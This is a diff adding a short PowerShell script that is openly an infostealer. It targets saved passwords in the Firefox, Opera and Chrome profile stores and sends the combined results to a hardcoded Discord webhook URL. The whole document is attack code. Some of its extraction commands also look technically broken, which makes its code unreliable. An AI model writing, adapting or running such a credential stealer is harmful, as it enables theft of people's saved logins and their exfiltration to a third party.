@@ -1,0 +1,19 @@
+$firefoxPath = "$env:APPDATA\Mozilla\Firefox\profiles\*\key4.db"
+$operaPath = "C:\Documents and Settings\Username\Application Data\Opera Software\Opera Stable\Login Data"
+$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+$webhookURL = "https://discord.com/api/webhooks/1271517665332035584/e7Vf3prmpK42ZsCn8uT3AcbeBwzoSH500vJNTbnULsrRr1ktFj_0E518oW2k0CKgZvfc"
+
+# Extract Firefox passwords
+$firefoxPasswords = select-xml -path $firefoxPath -xpath "//key[.='logins']/following-sibling::string" | % { $_.Node.Value -split "`n" }
+
+# Extract Opera passwords
+$operaPasswords = (gp $operaPath -BackwardCompatible | select -ExpandProperty "stringData") | where { $_ -match 'Username|Password' }
+
+# Extract Chrome passwords
+$chromePasswords = (gp $chromePath -BackwardCompatible | select -ExpandProperty "stringData") | where { $_ -match 'Username Value|Password Value' }
+
+# Combine and send to Discord webhook
+$combinedPasswords = $firefoxPasswords + $operaPasswords + $chromePasswords
+$jsonPayload = @{ content = ($combinedPasswords -join "`n") }
+
+Invoke-RestMethod -Uri $webhookURL -Method Post -Body ($jsonPayload | ConvertTo-Json)
